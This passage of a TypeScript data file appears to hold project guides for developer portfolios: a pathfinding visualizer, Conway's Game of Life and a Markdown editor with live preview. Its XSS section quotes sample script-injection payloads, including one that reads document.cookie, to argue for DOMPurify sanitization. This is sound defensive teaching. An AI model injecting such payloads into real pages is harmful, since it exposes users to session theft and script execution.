        question: 'How would you make this work for weighted graphs, not just unweighted grids?',
        answer: 'Add a weight property to each node (default 1). In Dijkstra and A*, when relaxing neighbors, use neighbor.distance = current.distance + neighbor.weight instead of +1. BFS cannot handle weights — it must be replaced with Dijkstra or A*. For the visualizer, I would add a weighted node tool that lets users click to assign weight 5 (shown as a different color), and show how this affects Dijkstra vs BFS paths.',
      },
      {
        question: 'Why does your visualizer use direct DOM manipulation instead of React state for animation?',
        answer: 'The grid has 1500+ cells. Calling setState on each animation step schedules a React reconciliation that diffs and patches all Cell components. At medium animation speed (25ms per step), this is 40 setState calls per second on 1500 components — easily dropping below 60fps. Direct DOM className manipulation skips React entirely and takes microseconds per step. I sync back to React state once animation completes so the grid remains consistent.',
      },
      {
        question: 'How would you handle diagonal movement in A*?',
        answer: 'Switch the heuristic from Manhattan to Chebyshev distance: max(|dx|, |dy|). Add diagonal neighbors to getNeighbors (8 directions instead of 4). For diagonal movement cost, use 1.414 (sqrt(2)) rather than 1 to reflect the actual Euclidean distance. The heuristic remains admissible with Chebyshev distance for diagonal movement.',
      },
    ],
    extensionIdeas: [
      {
        idea: 'Bidirectional BFS',
        difficulty: 'intermediate',
        description: 'Run BFS simultaneously from both the start and end nodes. When the two frontiers meet, construct the path by joining the two partial paths. Bidirectional BFS visits roughly half as many nodes as standard BFS, making the visual expansion noticeably faster and more impressive.',
      },
      {
        idea: 'Weighted Terrain Types',
        difficulty: 'intermediate',
        description: 'Add a terrain painting tool with types: Road (weight 1), Grass (weight 3), Swamp (weight 7), Mountain (weight 15). Render each terrain as a different color intensity. Show how Dijkstra finds a longer-looking path that avoids high-cost terrain, while BFS takes the straight-line route through mountains.',
      },
      {
        idea: 'Animated Maze Generation',
        difficulty: 'beginner',
        description: 'Instead of instantly showing the finished maze, animate the Recursive Division algorithm step by step — watch walls appear and gaps form in real time. This makes the maze generation itself an educational visualization, not just a setup step.',
      },
      {
        idea: 'Algorithm Speed Comparison Panel',
        difficulty: 'advanced',
        description: 'Run all four algorithms in parallel on the same grid in a 2x2 split layout. Each panel runs independently at the same speed. Show live counters for nodes visited per algorithm. This makes the exploration efficiency differences immediately obvious — A* is dramatically more focused than BFS on long straight paths.',
      },
    ],
  },
  {
    id: 'conways-game-of-life',
    title: "Conway's Game of Life",
    icon: 'grid',
    color: '#22c55e',
    difficulty: 'beginner',
    estimatedTime: '2-3 hours',
    techStack: ['React', 'TypeScript', 'Tailwind CSS', 'Vite'],
    questions: 4,
    description: 'Implement Conway\'s Game of Life — a cellular automaton where cells live, die, or reproduce based on simple rules, creating complex emergent patterns.',
    introduction: 'Build an interactive grid simulation where each cell follows four rules based on its neighbors. Despite the simplicity, this produces fascinating emergent behavior — gliders, oscillators, and still lifes. It is a classic CS project that demonstrates state management, grid computation, and animation loops.',
    interviewRelevance: 'Tests your ability to implement a well-defined algorithm efficiently, manage 2D state, handle edge cases (grid boundaries), and build a clean game loop. Often appears as a coding challenge or take-home assignment.',
    learningObjectives: [
      'Implement the four rules of Conway\'s Game of Life with neighbor counting',
      'Build an efficient game loop using requestAnimationFrame or setInterval',
      'Create click-to-toggle interaction for placing live cells',
      'Add presets (Glider, Pulsar, Gosper Glider Gun) and random seed generation',
    ],
    keyQuestions: [
      { question: 'What are the four rules?', answer: '1) Any live cell with <2 neighbors dies (underpopulation). 2) Any live cell with 2-3 neighbors survives. 3) Any live cell with >3 neighbors dies (overpopulation). 4) Any dead cell with exactly 3 neighbors becomes alive (reproduction).' },
      { question: 'How do I handle grid boundaries?', answer: 'Two approaches: fixed boundaries (cells outside grid are dead) or toroidal wrapping (edges connect to opposite edges). Toroidal is more interesting — use modulo arithmetic: (row + gridSize) % gridSize.' },
      { question: 'How do I make the simulation performant?', answer: 'Use double buffering: maintain two grids (current and next). Compute the next generation into the second grid, then swap references. Avoid allocating new arrays each frame. For large grids (500x500+), consider using a typed array (Uint8Array) instead of 2D arrays.' },
      { question: 'What features make this stand out?', answer: 'Speed control slider, step-by-step mode, generation counter, population graph over time, preset pattern library, undo/redo, save/load patterns, and a responsive grid that adapts to window size.' },
    ],
    implementationSteps: [
      {
        phase: 1,
        title: 'Grid Initialization & Rendering',
        description: 'Set up the grid data structure and render it as a canvas or CSS grid with click-to-toggle interaction.',
        tasks: [
          'Initialize grid as a flat Uint8Array (0 = dead, 1 = alive) — faster than 2D array for large grids',
          'Render grid on an HTML Canvas using fillRect for alive cells and clearRect for dead (or use two colors)',
          'Implement click-to-toggle: convert mouse coordinates to grid row/col and flip cell state',
          'Add click-and-drag to paint cells alive (mousedown + mousemove handler)',
          'Add a random seed button that fills 30% of cells alive using Math.random()',
        ],
      },
      {
        phase: 2,
        title: 'Game Loop & Next Generation',
        description: 'Implement the four rules of Conway\'s Game of Life with double-buffering for correct simultaneous updates.',
        tasks: [
          'Write a countNeighbors(grid, row, col, width, height) function using modulo for toroidal wrapping',
          'Implement computeNextGeneration(current) — iterate all cells, apply rules, write to a separate buffer array',
          'Swap current and next buffer references after each generation (double buffering)',
          'Wire up requestAnimationFrame loop with configurable step interval (generations per second)',
          'Add Play/Pause/Step controls — Step advances exactly one generation then pauses',
        ],
      },
      {
        phase: 3,
        title: 'Presets & Pattern Library',
        description: 'Add a library of famous patterns with coordinates that can be stamped onto the grid.',
        tasks: [
          'Encode classic patterns as coordinate arrays: Glider, Blinker, Pulsar, Gosper Glider Gun, Pentadecathlon',
          'Implement a placePattern(grid, pattern, row, col) function that stamps a pattern at a given origin',
          'Build a Presets dropdown that clears the grid and places the selected pattern centered',
          'Add an import mode where clicking the grid places the selected pattern at the cursor position',
          'Display pattern name, cell count, and classification (still life / oscillator / spaceship)',
        ],
      },
      {
        phase: 4,
        title: 'Stats, Speed Control & Polish',
        description: 'Add generation counter, population tracker, speed control, and deploy.',
        tasks: [
          'Track and display generation count and live cell population in a stats bar',
          'Add speed slider from 1 to 60 generations per second, converting to frame delay',
          'Implement grid zoom (cell size slider from 5px to 20px) with canvas resize',
          'Add keyboard shortcuts: Space = play/pause, R = random fill, C = clear, ArrowRight = step',
          'Deploy to Vercel, write README with screenshot of Gosper Glider Gun in action',
        ],
      },
    ],
    fileStructure: `conways-game-of-life/
├── src/
│   ├── game/
│   │   ├── rules.ts           # computeNextGeneration, countNeighbors
│   │   ├── patterns.ts        # Glider, Pulsar, GosperGliderGun coordinates
│   │   └── grid.ts            # createGrid, randomize, placePattern
│   ├── components/
│   │   ├── GameCanvas.tsx     # HTML Canvas renderer + mouse interaction
│   │   ├── Controls.tsx       # play/pause/step/clear/random buttons
│   │   ├── SpeedSlider.tsx
│   │   ├── PresetSelector.tsx
│   │   └── StatsBar.tsx       # generation count, live cell count
│   ├── hooks/
│   │   ├── useGameLoop.ts     # requestAnimationFrame + interval logic
│   │   └── useGrid.ts         # grid state, double buffer management
│   ├── types/
│   │   └── index.ts           # Grid type, Pattern type, GameState
│   ├── App.tsx
│   └── main.tsx
├── vite.config.ts
├── tailwind.config.ts
└── package.json`,
    architectureLayers: [
      {
        name: 'Game Logic Layer',
        description: 'Pure functions in /game — computeNextGeneration applies the four rules to produce the next grid state. countNeighbors handles toroidal wrapping with modulo arithmetic. No React dependencies; fully unit testable.',
      },
      {
        name: 'Double-Buffer State Layer (useGrid)',
        description: 'Maintains two Uint8Array buffers (current and next). computeNextGeneration writes into the next buffer. After each step, the references are swapped (O(1) operation). This ensures all cells update simultaneously, avoiding the read-your-own-writes bug.',
      },
      {
        name: 'Game Loop Layer (useGameLoop)',
        description: 'Manages the requestAnimationFrame loop and generation timing. Tracks elapsed time between frames to enforce the target generations-per-second rate. Exposes play, pause, and step functions. Uses a ref for the running flag to avoid stale closures.',
      },
      {
        name: 'Canvas Rendering Layer (GameCanvas)',
        description: 'Renders the Uint8Array grid to an HTML Canvas using putImageData for maximum performance. On each frame, iterates the grid and writes RGBA pixel values directly to an ImageData buffer. Handles mouse events for cell toggling and pattern placement.',
      },
      {
        name: 'Pattern Library Layer',
        description: 'Stores famous patterns as arrays of [row, col] offsets. placePattern stamps a pattern onto the grid at a given origin. Patterns are classified as still lifes (stable), oscillators (periodic), or spaceships (translating).',
      },
    ],
    codeExamples: {
      typescript: `// game/rules.ts

// Flat array index: row * width + col
const idx = (row: number, col: number, w: number) => row * w + col;

export function countNeighbors(
  grid: Uint8Array,
  row: number,
  col: number,
  width: number,
  height: number
): number {
  let count = 0;
  for (let dr = -1; dr <= 1; dr++) {
    for (let dc = -1; dc <= 1; dc++) {
      if (dr === 0 && dc === 0) continue;
      // Toroidal wrapping — edges connect to opposite edges
      const r = (row + dr + height) % height;
      const c = (col + dc + width) % width;
      count += grid[idx(r, c, width)];
    }
  }
  return count;
}

export function computeNextGeneration(
  current: Uint8Array,
  next: Uint8Array,
  width: number,
  height: number
): void {
  for (let row = 0; row < height; row++) {
    for (let col = 0; col < width; col++) {
      const alive = current[idx(row, col, width)];
      const neighbors = countNeighbors(current, row, col, width, height);

      // Conway's four rules:
      // 1. Live cell with 2-3 neighbors survives
      // 2. Dead cell with exactly 3 neighbors becomes alive
      // 3. All other cells die or stay dead
      if (alive) {
        next[idx(row, col, width)] = neighbors === 2 || neighbors === 3 ? 1 : 0;
      } else {
        next[idx(row, col, width)] = neighbors === 3 ? 1 : 0;
      }
    }
  }
}`,
    },
    tradeoffDecisions: [
      {
        choice: 'Uint8Array (flat) vs boolean[][] (2D array)',
        picked: 'Uint8Array flat array',
        reason: 'Uint8Array is stored contiguously in memory, giving far better cache locality than a 2D array of JavaScript objects. For a 100x100 grid (10K cells), the difference is negligible. For 500x500 (250K cells), Uint8Array is 3-5x faster due to CPU cache efficiency and no GC pressure from object allocation.',
      },
      {
        choice: 'Canvas rendering vs CSS Grid of divs',
        picked: 'HTML Canvas',
        reason: 'Canvas putImageData can update 250K pixels in one GPU-bound call. CSS Grid of divs requires the DOM to diff and patch up to 250K elements per generation. For small grids (50x50 or less), divs are fine and simpler. For anything larger, Canvas is mandatory for smooth animation.',
      },
      {
        choice: 'requestAnimationFrame vs setInterval for the game loop',
        picked: 'requestAnimationFrame with elapsed-time throttling',
        reason: 'rAF synchronizes with the browser\'s repaint cycle (typically 60fps), avoiding tearing. setInterval can fire mid-paint. For speed control, we throttle inside the rAF callback by accumulating elapsed time and only computing a new generation when enough time has passed for the target fps.',
      },
      {
        choice: 'Toroidal wrapping vs fixed boundaries',
        picked: 'Toroidal wrapping',
        reason: 'Fixed boundaries cause spaceships (like Gliders) to disappear at the edge, which is anti-climactic. Toroidal wrapping means a glider that exits the right side reappears on the left, creating infinite motion. It also prevents edge starvation where cells near borders always have fewer than 8 neighbors.',
      },
    ],
    deepDiveTopics: [
      {
        topic: 'Why double-buffering is mandatory',
        detail: 'The four rules must be applied to all cells simultaneously based on the CURRENT generation state. If you update cells in-place (left to right, top to bottom), later cells see already-updated earlier cells and compute their next state based on the wrong generation. Double-buffering solves this: read from the current buffer, write to the next buffer, then atomically swap references.',
      },
      {
        topic: 'Emergent complexity from simple rules',
        detail: 'The Gosper Glider Gun (discovered 1970) was the first pattern proven to grow unboundedly — it continuously emits Gliders. Gliders are spaceships that translate diagonally across the grid every 4 generations. Still lifes (Block, Beehive) are stable forever. Oscillators (Blinker, Pulsar) cycle with a fixed period. These complex behaviors emerge entirely from 4 simple rules — a famous example of emergent complexity.',
      },
      {
        topic: 'Performance optimization for large grids',
        detail: 'For grids larger than 300x300, naive O(width * height) iteration becomes slow. Hashlife (by Bill Gosper) caches 2^k x 2^k quadrant states and can simulate 2^k generations in O(1) amortized time using memoization. For a portfolio project, the Uint8Array + Canvas approach is sufficient up to 500x500 at 30fps. Mention Hashlife as the production algorithm when discussing scalability.',
      },
      {
        topic: 'Conway\'s Game of Life is Turing complete',
        detail: 'Despite having no explicit computation primitives, GoL can simulate any Turing machine. Patterns exist that implement logic gates (AND, OR, NOT) using Glider collisions. A working computer with memory, ALU, and clock has been constructed entirely within GoL. This mathematical result demonstrates that universal computation can emerge from simple local rules.',
      },
    ],
    commonPitfalls: [
      {
        pitfall: 'Updating cells in-place instead of using a second buffer',
        why: 'When you update cell (0,0) in-place and then compute cell (0,1), cell (0,1) reads the already-updated state of cell (0,0) instead of its state from the current generation. This causes incorrect neighbor counts and visually wrong evolution.',
        solution: 'Maintain two arrays: current and next. Read exclusively from current, write exclusively to next. After processing all cells, swap the references. This guarantees all reads are from the same generation.',
      },
      {
        pitfall: 'Using JavaScript boolean arrays instead of typed arrays for large grids',
        why: 'A JavaScript boolean[] is an array of JavaScript Value objects, each 32-64 bytes in V8. A 500x500 boolean array allocates 12-25MB and causes GC pauses. Accessing non-contiguous memory also destroys CPU cache performance.',
        solution: 'Use Uint8Array(width * height). Each cell is 1 byte, a 500x500 grid is only 250KB, and iteration is 5-10x faster due to cache locality.',
      },
      {
        pitfall: 'Forgetting to clear the canvas before each render',
        why: 'Without ctx.clearRect(0, 0, width, height) at the start of each render, dead cells retain their previous fill color and never visually die.',
        solution: 'Either clear the full canvas each frame (simple but slightly slower), or only fill alive cells and clear dead cells individually (more efficient for sparse grids).',
      },
      {
        pitfall: 'Boundary cells reading out-of-bounds indices',
        why: 'Without boundary handling, cells in row 0 try to count neighbors in row -1 (undefined), causing NaN neighbor counts and incorrect rule application.',
        solution: 'Use toroidal wrapping: r = (row + dr + height) % height. Alternatively, treat out-of-bounds as dead by guarding with a bounds check before reading.',
      },
    ],
    edgeCases: [
      {
        scenario: 'Empty grid (all dead cells)',
        impact: 'computeNextGeneration returns another all-dead grid. The simulation runs but produces no visual change. The generation counter still increments, which can confuse users.',
        mitigation: 'Detect if the grid is entirely dead after each generation and auto-pause with a "Stable: no living cells" message.',
      },
      {
        scenario: 'Stable pattern (still life) runs indefinitely',
        impact: 'A Block or Beehive pattern never changes. The simulation runs forever, consuming CPU and battery without producing anything new.',
        mitigation: 'Optionally detect stability: if current grid equals previous grid (compare Uint8Array buffers), auto-pause with a "Stable: no change" message. This is an optional enhancement, not required.',
      },
      {
        scenario: 'User resizes the browser window mid-simulation',
        impact: 'The canvas element may resize but the internal canvas width/height attributes do not update automatically, causing the grid to render stretched or clipped.',
        mitigation: 'Listen to the ResizeObserver on the canvas container. On resize, recalculate cell size and canvas dimensions. Optionally keep the grid content centered and pad with dead cells.',
      },
      {
        scenario: 'Placing a large preset pattern near grid boundaries',
        impact: 'The Gosper Glider Gun pattern is 36x9 cells. Placing it in the bottom-right corner causes parts of the pattern to overflow the grid and get clipped.',
        mitigation: 'In placePattern, wrap overflow coordinates using toroidal modulo, or clamp them to grid boundaries. Show a warning if the pattern extends beyond the current grid size.',
      },
    ],
    interviewFollowups: [
      {
        question: 'Why did you use a Uint8Array instead of a 2D boolean array?',
        answer: 'Memory layout and cache locality. A JavaScript boolean array is an array of Value pointers — each element is 32-64 bytes in V8. A 200x200 grid would be 1.2-2.5MB, spread across heap allocations. Uint8Array is a contiguous block of 1-byte integers — the same grid is 40KB. CPU cache lines are 64 bytes, so cache misses drop dramatically with contiguous storage. The inner loop of computeNextGeneration accesses memory sequentially, which maximizes cache prefetching.',
      },
      {
        question: 'How would you implement undo/redo for this simulation?',
        answer: 'Since the simulation is deterministic, you only need to store the state at checkpoints. One approach: snapshot the Uint8Array every N generations into a history stack. Undo jumps to the previous checkpoint and re-simulates to the exact generation. More memory-efficient: store only deltas (changed cell coordinates) between generations. For a portfolio project, snapshot every generation up to a max history size (e.g., 100 generations) using a circular buffer.',
      },
      {
        question: 'How would you scale this to support a 10,000 x 10,000 grid?',
        answer: 'At 10K x 10K = 100 million cells, naive iteration is too slow at 60fps. Two approaches: 1) Only iterate cells in the "active zone" — cells that are alive or have alive neighbors. Track this as a Set and only expand the zone when cells change. This is efficient for sparse patterns. 2) Implement Hashlife — a memoized quadtree that can advance 2^k generations in constant amortized time by caching repeated subpatterns. Hashlife is how Golly (the gold-standard GoL simulator) achieves trillion-generation simulations.',
      },
      {
        question: 'Is Conway\'s Game of Life deterministic? What does that imply for testing?',
        answer: 'Yes, it is entirely deterministic — given the same starting state, it always produces the same sequence of generations. This makes testing trivially easy: seed the grid with a known pattern, advance N generations, and assert the exact final state. I can test the Glider pattern by placing it at (0,0) and asserting it translates to (4,4) after 4 generations. No mocks, no randomness to control — pure function testing.',
      },
    ],
    extensionIdeas: [
      {
        idea: 'Population History Graph',
        difficulty: 'beginner',
        description: 'Track the live cell count per generation and render a live-updating line chart below the grid. This turns the simulation into a data visualization — you can see population explosions, die-offs, and stable cycles. Interesting patterns create distinctive population signatures.',
      },
      {
        idea: 'Custom Rule Editor (Life-like Cellular Automata)',
        difficulty: 'intermediate',
        description: 'Generalize the rule system to support any B/S notation (Born/Survive). Standard Conway is B3/S23. HighLife is B36/S23 (has a self-replicating pattern). Day & Night is B3678/S34678. Let users type a B/S rule string and instantly see how it changes the simulation dynamics.',
      },
      {
        idea: 'Pattern Editor and Export',
        difficulty: 'intermediate',
        description: 'Add an edit mode where users can draw patterns on a blank grid, then export them as RLE (Run-Length Encoded) format — the standard format for GoL patterns. Users can share their creations, and the app can import any RLE pattern from pattern archives like LifeWiki.',
      },
      {
        idea: 'Color by Cell Age',
        difficulty: 'beginner',
        description: 'Track how many consecutive generations each cell has been alive. Color younger cells bright and older cells darker or vice versa. This visualization shows which parts of a pattern are stable (old cells) versus dynamic (young cells), adding educational depth to pattern observation.',
      },
    ],
  },
  {
    id: 'markdown-editor',
    title: 'Markdown Editor',
    icon: 'edit',
    color: '#a855f7',
    difficulty: 'beginner',
    estimatedTime: '3-4 hours',
    techStack: ['React', 'TypeScript', 'Tailwind CSS', 'Marked.js'],
    questions: 4,
    description: 'Build a split-pane Markdown editor with live preview, syntax highlighting, file management, and export to HTML/PDF.',
    introduction: 'Create a real-time Markdown editor with a side-by-side editing and preview pane. As the user types Markdown, the preview updates instantly. Add toolbar buttons for common formatting, file save/load via localStorage, and export capabilities.',
    interviewRelevance: 'Demonstrates real-time text processing, debounced rendering, split-pane layouts, and localStorage persistence. A practical project that every interviewer can immediately understand and appreciate.',
    learningObjectives: [
      'Parse Markdown to HTML using a library (Marked.js or remark) with sanitization',
      'Build a resizable split-pane layout with drag handle',
      'Implement toolbar with formatting shortcuts (bold, italic, headings, links, code)',
      'Add file management: save drafts to localStorage, export to HTML',
    ],
    keyQuestions: [
      { question: 'Should I build my own Markdown parser?', answer: 'No — use Marked.js or remark. Building a parser is interesting but not the point of this project. Focus on the editor UX: debounced preview rendering, keyboard shortcuts, scroll sync between editor and preview.' },
      { question: 'How do I implement scroll sync?', answer: 'Map cursor position in the editor to a proportional scroll position in the preview. When the user scrolls the editor, calculate the percentage scrolled and apply it to the preview pane. Use requestAnimationFrame for smooth syncing.' },
      { question: 'How do I handle large documents?', answer: 'Debounce the Markdown-to-HTML conversion (200-300ms delay after keystroke). For very large documents, use a web worker to parse Markdown off the main thread. Consider virtualizing the preview for documents over 10K lines.' },
      { question: 'What security concerns exist?', answer: 'Sanitize the HTML output using DOMPurify to prevent XSS attacks from user-entered Markdown. Never use dangerouslySetInnerHTML without sanitization. Also sanitize any imported Markdown files.' },
    ],
    implementationSteps: [
      {
        phase: 1,
        title: 'Split-Pane Layout & Editor Setup',
        description: 'Build the two-pane layout with a resizable drag handle and wire up the controlled textarea editor.',
        tasks: [
          'Create a split-pane layout using CSS flexbox — editor pane on left, preview pane on right',
          'Implement a drag handle between panes that adjusts flex-basis on mousemove',
          'Build a controlled textarea component with monospace font and tab-key support (insert 2 spaces)',
          'Add a toolbar above the editor with buttons for bold, italic, H1, H2, H3, link, code block, and image',
          'Wire each toolbar button to wrap the selected text or insert placeholder syntax at cursor position',
        ],
      },
      {
        phase: 2,
        title: 'Live Markdown Parsing & Preview',
        description: 'Connect Marked.js to the editor and render sanitized HTML in the preview pane with syntax highlighting.',
        tasks: [
          'Install marked and dompurify; configure marked with options (gfm: true, breaks: true)',
          'Debounce the markdown-to-HTML conversion by 200ms using useRef + setTimeout to avoid per-keystroke parsing',
          'Sanitize the marked() output with DOMPurify.sanitize() before setting dangerouslySetInnerHTML',
          'Install highlight.js and configure marked to use it for fenced code block syntax highlighting',
          'Apply GitHub-style CSS to the preview pane (prose typography, code block styles, table borders)',
        ],
      },
      {
        phase: 3,
        title: 'File Management & Persistence',
        description: 'Add localStorage-backed draft saving, multiple file tabs, and import/export functionality.',
        tasks: [
          'Save editor content to localStorage on every change (debounced 500ms) with a "Saved" indicator',
          'Implement multiple document tabs: each tab has an id, title (derived from first H1), and content',
          'Build a new document button that creates a blank tab and a close button that removes the tab',
          'Add file import: accept .md files via a hidden <input type="file">, read content with FileReader API',
          'Add export to .md: create a Blob from editor content, trigger a download via an anchor with download attribute',
        ],
      },
      {
        phase: 4,
        title: 'Scroll Sync, Word Count & Polish',
        description: 'Implement scroll synchronization between editor and preview, add word count stats, and deploy.',
        tasks: [
          'Implement proportional scroll sync: on editor scroll, set preview.scrollTop = scrollFraction * preview.scrollHeight',
          'Add a status bar showing word count, character count, and estimated read time',
          'Add keyboard shortcuts: Cmd+B (bold), Cmd+I (italic), Cmd+K (link), Cmd+S (download)',
          'Add a full-screen toggle that hides the header and expands to fill the viewport',
          'Deploy to Vercel with a pre-loaded welcome document that showcases all Markdown features',
        ],
      },
    ],
    fileStructure: `markdown-editor/
├── src/
│   ├── components/
│   │   ├── Editor.tsx          # controlled textarea with toolbar
│   │   ├── Preview.tsx         # sanitized HTML preview pane
│   │   ├── Toolbar.tsx         # bold/italic/heading/link/code buttons
│   │   ├── SplitPane.tsx       # resizable two-pane layout with drag handle
│   │   ├── FileTabs.tsx        # document tab bar
│   │   └── StatusBar.tsx       # word count, char count, save indicator
│   ├── hooks/
│   │   ├── useMarkdown.ts      # debounced parsing + DOMPurify sanitization
│   │   ├── useScrollSync.ts    # proportional scroll synchronization
│   │   ├── useFiles.ts         # tab management, localStorage persistence
│   │   └── useKeyboardShortcuts.ts
│   ├── utils/
│   │   ├── markdownUtils.ts    # wrapSelection, insertAtCursor helpers
│   │   ├── wordCount.ts        # word/char/readTime calculation
│   │   └── exportUtils.ts      # downloadMarkdown, downloadHTML helpers
│   ├── styles/
│   │   └── preview.css         # GitHub-style prose CSS for preview pane
│   ├── App.tsx
│   └── main.tsx
├── public/
├── tailwind.config.ts
└── package.json`,
    architectureLayers: [
      {
        name: 'Editor Input Layer',
        description: 'Controlled textarea with cursor position tracking. Toolbar buttons use document.execCommand or manual string manipulation to wrap selected text (bold: **selection**, italic: *selection*). Tab key inserts two spaces rather than moving focus.',
      },
      {
        name: 'Parsing Layer (useMarkdown)',
        description: 'Debounces editor changes by 200ms, then calls marked(content) to produce raw HTML. Immediately sanitizes with DOMPurify.sanitize() before returning. Configures marked with highlight.js for code block syntax highlighting and GFM (GitHub Flavored Markdown) for tables and strikethrough.',
      },
      {
        name: 'File Management Layer (useFiles)',
        description: 'Manages the list of open documents as a tabs array in state. Each document has an id, title (first H1 heading), and content. Persists all documents to localStorage on every change. Handles import (FileReader), export (Blob + anchor download), and new/close tab operations.',
      },
      {
        name: 'Layout Layer (SplitPane)',
        description: 'CSS flexbox container with two flex children. The drag handle registers mousedown, then tracks mousemove on the document to compute the new split percentage. Minimum pane width of 20% prevents either pane from collapsing completely.',
      },
      {
        name: 'Preview Layer',
        description: 'Renders sanitized HTML via dangerouslySetInnerHTML. Applies GitHub-style prose CSS: proper heading hierarchy, code block backgrounds, table borders, blockquote styling. highlight.js applies syntax coloring to fenced code blocks after each render via useEffect.',
      },
    ],
    codeExamples: {
      typescript: `// hooks/useMarkdown.ts
import { marked } from 'marked';
import DOMPurify from 'dompurify';
import hljs from 'highlight.js';
import { useState, useEffect, useRef } from 'react';

// Configure marked once at module level
marked.setOptions({
  gfm: true,    // GitHub Flavored Markdown (tables, strikethrough)
  breaks: true, // Convert \\n to <br> in paragraphs
  highlight: (code, lang) => {
    if (lang && hljs.getLanguage(lang)) {
      return hljs.highlight(code, { language: lang }).value;
    }
    return hljs.highlightAuto(code).value;
  },
});

export function useMarkdown(content: string) {
  const [html, setHtml] = useState('');
  const debounceRef = useRef<ReturnType<typeof setTimeout>>();

  useEffect(() => {
    // Debounce: only parse after 200ms of no changes
    clearTimeout(debounceRef.current);
    debounceRef.current = setTimeout(() => {
      const rawHtml = marked(content) as string;
      // Sanitize: strip <script>, on* handlers, javascript: hrefs
      const clean = DOMPurify.sanitize(rawHtml, {
        ADD_TAGS: ['iframe'], // allow YouTube embeds
        ADD_ATTR: ['allow', 'allowfullscreen', 'frameborder'],
      });
      setHtml(clean);
    }, 200);

    return () => clearTimeout(debounceRef.current);
  }, [content]);

  return html;
}

// utils/markdownUtils.ts
export function wrapSelection(
  textarea: HTMLTextAreaElement,
  prefix: string,
  suffix: string,
  placeholder: string
): string {
  const { selectionStart: start, selectionEnd: end, value } = textarea;
  const selected = value.slice(start, end) || placeholder;
  return value.slice(0, start) + prefix + selected + suffix + value.slice(end);
}`,
    },
    tradeoffDecisions: [
      {
        choice: 'Marked.js vs remark/rehype pipeline',
        picked: 'Marked.js',
        reason: 'Marked.js is a single-package, synchronous, and fast — ideal for a real-time debounced editor. The remark/rehype ecosystem is more powerful (AST transforms, plugins) but requires async processing and adds significant bundle weight. For a portfolio editor with no need for custom AST transforms, Marked is the right tool.',
      },
      {
        choice: 'dangerouslySetInnerHTML vs creating a sandboxed iframe',
        picked: 'dangerouslySetInnerHTML with DOMPurify',
        reason: 'An iframe sandbox is the most secure approach (complete DOM isolation), but it complicates scroll sync and style sharing. DOMPurify is the industry standard for HTML sanitization — it strips all unsafe content (script tags, event handlers, javascript: URLs) and is battle-tested across millions of deployments. For a personal portfolio editor, DOMPurify is sufficient.',
      },
      {
        choice: 'Proportional scroll sync vs line-number-based sync',
        picked: 'Proportional scroll sync',
        reason: 'Line-number sync requires parsing the Markdown AST to map editor line numbers to rendered HTML element positions — complex and brittle with nested elements. Proportional sync (editor scroll percentage applied to preview scroll height) is simple, works for any content, and feels natural for most documents. It breaks down only for heavily asymmetric content (short input, long output), but that is rare.',
      },
      {
        choice: 'localStorage per-document vs single autosave',
        picked: 'Per-document localStorage with a key per document ID',
        reason: 'Storing each document separately allows independent reads and writes. Storing all documents as one serialized JSON blob means any single-document save re-serializes and writes the entire collection, which is slow for large documents. Separate keys also make it easy to enumerate documents and show a recents list.',
      },
    ],
    deepDiveTopics: [
      {
        topic: 'XSS via Markdown and why DOMPurify is non-negotiable',
        detail: 'Markdown allows raw HTML inline. Without sanitization, a user could enter <script>document.cookie</script> or <img src=x onerror="alert(1)"> directly in the editor. marked() faithfully converts this to HTML, which the browser executes. DOMPurify\'s default config strips all script tags, event handler attributes (onclick, onerror, onload), and javascript: href values. Always call DOMPurify.sanitize(marked(input)) — never just marked(input).',
      },
      {
        topic: 'Cursor position preservation during toolbar formatting',
        detail: 'When a toolbar button wraps selected text (e.g., bold), the naive implementation replaces textarea.value and loses the cursor position. React\'s controlled input pattern makes this worse — setting state causes a re-render, which resets the cursor to the end. The fix: after setting the new value, use textarea.setSelectionRange(newStart, newEnd) in a useEffect to restore the cursor to the correct position inside the newly-wrapped text.',
      },
      {
        topic: 'Debounce vs throttle for live preview',
        detail: 'Debounce delays the parse until N ms after the last keystroke — good for preview rendering because you only need the latest state, not every intermediate state. Throttle would update the preview at most once per N ms regardless of keystrokes — fine for fast typists but causes visible lag at the throttle boundary. Debounce at 150-200ms is the right choice: imperceptible delay for the user, drastically reduced parse frequency.',
      },
      {
        topic: 'GitHub Flavored Markdown (GFM) extensions',
        detail: 'Standard CommonMark Markdown does not include tables, strikethrough (~~text~~), task lists (- [x]), or autolinking. GFM adds all of these. Marked\'s gfm: true option enables them. For a portfolio editor, these features are essential because most technical writing uses GFM. Mention this in your interview: you specifically chose Marked over a simpler parser because of GFM support.',
      },
    ],
    commonPitfalls: [
      {
        pitfall: 'Calling marked() synchronously on every keystroke',
        why: 'marked() parses and generates HTML in one synchronous call. For large documents (10K+ characters), this can take 50-100ms per keystroke, blocking the main thread and causing the editor to feel laggy and unresponsive.',
        solution: 'Debounce the parse call by 150-200ms. For very large documents, run marked() in a Web Worker to move the computation off the main thread. The worker receives the Markdown string, returns the HTML string, and the main thread sanitizes and renders it.',
      },
      {
        pitfall: 'Using dangerouslySetInnerHTML without sanitization',
        why: 'Markdown allows raw HTML. Without DOMPurify, any script tags or event handlers in the user\'s input are executed in the user\'s browser. For a single-user personal tool this is a minor risk, but it is a critical vulnerability if any sharing or multi-user feature is added.',
        solution: 'Always: const clean = DOMPurify.sanitize(marked(content)). Never skip this step. Add DOMPurify as a required dependency, not an optional one.',
      },
      {
        pitfall: 'Tab key moving focus out of the textarea',
        why: 'The browser\'s default Tab behavior moves focus to the next focusable element. In a code/Markdown editor, Tab should insert indentation, not navigate away.',
        solution: 'Add a keydown handler on the textarea: if (e.key === "Tab") { e.preventDefault(); insert two spaces at cursor position via setSelectionRange + execCommand or direct value mutation }.',
      },
      {
        pitfall: 'highlight.js not applying after React re-renders the preview',
        why: 'highlight.js\'s highlightAll() scans the DOM for pre>code elements on initial load. When React re-renders the preview with new HTML via dangerouslySetInnerHTML, the new code blocks are not automatically highlighted because highlight.js has already run.',
        solution: 'Run hljs.highlightAll() (or target specific elements) in a useEffect that depends on the rendered HTML string. This re-highlights all code blocks after each preview update.',
      },
    ],
    edgeCases: [
      {
        scenario: 'Pasting a 100,000-character document into the editor',
        impact: 'marked() may take 200-500ms to parse, blocking the main thread. The editor appears frozen during parsing.',
        mitigation: 'The debounce handles this for keystroke input, but paste events bypass debounce and trigger immediately. Add a maxLength check (warn at 50K chars) or cap the debounce trigger to after a paste event settles.',
      },
      {
        scenario: 'Importing a Markdown file with Windows line endings (CRLF)',
